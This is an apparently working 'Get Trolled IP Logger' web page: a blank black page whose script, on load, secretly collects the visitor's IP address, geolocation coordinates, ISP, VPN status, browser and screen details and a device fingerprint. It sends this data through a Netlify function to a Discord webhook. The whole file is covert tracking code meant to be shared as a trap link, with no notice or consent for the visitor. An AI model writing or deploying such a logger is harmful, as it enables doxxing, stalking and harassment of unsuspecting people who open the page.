<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title></title>
  <style>
    html, body {
      margin: 0; padding: 0; height: 100%;
      background: black;
      user-select: none;
      overflow: hidden;
    }
    #error-message {
      position: fixed;
      top: 0; left: 0; right: 0;
      color: red;
      background: black;
      padding: 10px;
      font-family: monospace;
      white-space: pre-wrap;
      cursor: pointer;
      display: none;
      z-index: 9999;
      max-height: 50vh;
      overflow-y: auto;
    }
  </style>
</head>
<body>
  <div id="error-message" title="Click to copy error message"></div>

<script>
  const netlifyFunctionUrl = "/.netlify/functions/log-ip";

  function safeGet(obj, path, defaultValue = '') {
    return path.reduce((acc, key) => (acc && acc[key] !== undefined) ? acc[key] : defaultValue, obj);
  }

  function safeValue(val, maxLen=1024) {
    if (val === undefined || val === null || val === '') return "N/A";
    val = val.toString();
    if (val.length > maxLen) return val.slice(0, maxLen - 3) + '...';
    return val;
  }

  function safeName(name) {
    if (!name) return "N/A";
    return name.length > 256 ? name.slice(0, 253) + "..." : name;
  }

  function parseUserAgent(ua) {
    let os = "Unknown OS";
    let browser = "Unknown Browser";

    if (/Android/.test(ua)) {
      os = "Android";
    } else if (/iPhone/.test(ua)) {
      os = "iOS (iPhone)";
    } else if (/iPad/.test(ua)) {
      os = "iOS (iPad)";
    } else if (/Windows NT/.test(ua)) {
      os = "Windows";
    } else if (/Mac OS X/.test(ua)) {
      os = "Mac OS";
    }

    if (/Chrome\/\d+/.test(ua)) {
      browser = "Chrome";
    } else if (/Firefox\/\d+/.test(ua)) {
      browser = "Firefox";
    } else if (/Safari\/\d+/.test(ua) && !/Chrome/.test(ua)) {
      browser = "Safari";
    } else if (/Edg\/\d+/.test(ua)) {
      browser = "Edge";
    }

    return { os, browser };
  }

  function chunkArray(arr, size) {
    const result = [];
    for(let i = 0; i < arr.length; i += size) {
      result.push(arr.slice(i, i + size));
    }
    return result;
  }

  // Hash + fingerprint
  function hashString(str) {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
      const chr = str.charCodeAt(i);
      hash = (hash << 5) - hash + chr;
      hash |= 0;
    }
    return Math.abs(hash).toString(16);
  }

  function getDeviceFingerprint() {
    const fingerprintData = [
      navigator.userAgent,
      window.screen.width,
      window.screen.height,
      window.devicePixelRatio,
      window.screen.colorDepth,
      window.innerWidth,
      window.innerHeight,
      navigator.language,
      navigator.platform
    ].join('|');
    return hashString(fingerprintData);
  }

  async function fetchIPInfo() {
    const res = await fetch('https://ipwhois.app/json/');
    if (!res.ok) throw new Error('Failed to fetch IP info');
    return res.json();
  }

  async function fetchIPv6() {
    try {
      const res = await fetch('https://api64.ipify.org?format=json');
      if (!res.ok) return "N/A";
      const json = await res.json();
      if (json.ip && json.ip.includes(':')) {
        return json.ip;
      }
      return "N/A";
    } catch {
      return "N/A";
    }
  }

  async function sendDiscordWebhook(embeds) {
    const res = await fetch(netlifyFunctionUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ embeds }),
    });
    if (!res.ok) {
      const text = await res.text();
      throw new Error(`Discord webhook error: ${res.status} - ${text}`);
    }
  }

  (async () => {
    const errorDiv = document.getElementById('error-message');

    try {
      const data = await fetchIPInfo();
      const ipv6 = await fetchIPv6();
      const uaInfo = parseUserAgent(navigator.userAgent);
      const localTime = new Date().toLocaleString("en-US", { timeZone: data.timezone });

      const allFields = [
        { name: "Device Fingerprint", value: `\`${getDeviceFingerprint()}\``, inline: false },
        { name: "IPv4 Address", value: `\`${safeValue(data.ip)}\``, inline: true },
        { name: "IPv6 Address", value: ipv6, inline: true },
        { name: "Country", value: `${safeValue(data.country)} (${safeValue(data.country_code)})`, inline: true },
        { name: "Latitude", value: safeValue(data.latitude), inline: true },
        { name: "Longitude", value: safeValue(data.longitude), inline: true },
        { name: "ISP", value: safeValue(data.isp), inline: false },
        { name: "Organization", value: safeValue(data.org), inline: false },
        { name: "ASN", value: safeValue(data.asn), inline: true },
        { name: "Timezone", value: `${safeValue(data.timezone_gmt)} (${safeValue(data.timezone)})`, inline: true },
        { name: "Local Time", value: safeValue(localTime), inline: true },
        { name: "VPN/Proxy", value: safeValue(safeGet(data, ['security', 'is_proxy']) ? "Yes" : "No"), inline: true },
        { name: "VPN/Hosting", value: safeValue(safeGet(data, ['security', 'is_hosting']) ? "Yes" : "No"), inline: true },
        { name: "Bot", value: safeValue(safeGet(data, ['security', 'is_bot']) ? "Yes" : "No"), inline: true },
        { name: "Operating System", value: safeValue(uaInfo.os), inline: true },
        { name: "Browser", value: safeValue(uaInfo.browser), inline: true },
        { name: "Full User Agent", value: `\`\`\`${safeValue(navigator.userAgent, 1000)}\`\`\``, inline: false },
        { name: "Screen Resolution", value: `\`${safeValue(window.screen.width)}Ã—${safeValue(window.screen.height)} @${safeValue(window.devicePixelRatio)} DPR\``, inline: true },
        { name: "Color Depth", value: `${safeValue(window.screen.colorDepth)}-bit`, inline: true },
        { name: "Viewport Size", value: `${safeValue(window.innerWidth)}Ã—${safeValue(window.innerHeight)}`, inline: true }
      ];

      const chunks = chunkArray(allFields, 25);

      const embeds = chunks.map((fieldsChunk, i) => ({
        title: i === 0 ? "ðŸ•µï¸ New Visitor Logged" : undefined,
        color: 0x00ffff,
        timestamp: new Date().toISOString(),
        footer: i === chunks.length - 1 ? {
          text: "Get Trolled IP Logger",
          icon_url: "https://i.imgur.com/qZ7j0fV.png"
        } : undefined,
        thumbnail: i === 0 ? {
          url: safeValue(data.country_flag, 200)
        } : undefined,
        author: i === 0 ? {
          name: "Get Trolled IP Logger",
          url: "https://discord.com",
          icon_url: "https://i.imgur.com/qZ7j0fV.png"
        } : undefined,
        fields: fieldsChunk.map(f => ({
          name: safeName(f.name),
          value: safeValue(f.value),
          inline: !!f.inline
        }))
      }));

      await sendDiscordWebhook(embeds);

    } catch (err) {
      errorDiv.style.display = "block";
      errorDiv.textContent = `Error:\n${err.message}\n\nClick to copy error message.`;
      errorDiv.onclick = () => {
        navigator.clipboard.writeText(err.message)
          .then(() => alert("Error message copied! Send it to me."))
          .catch(() => alert("Failed to copy error message."));
      };
    }
  })();
</script>
</body>
</html>
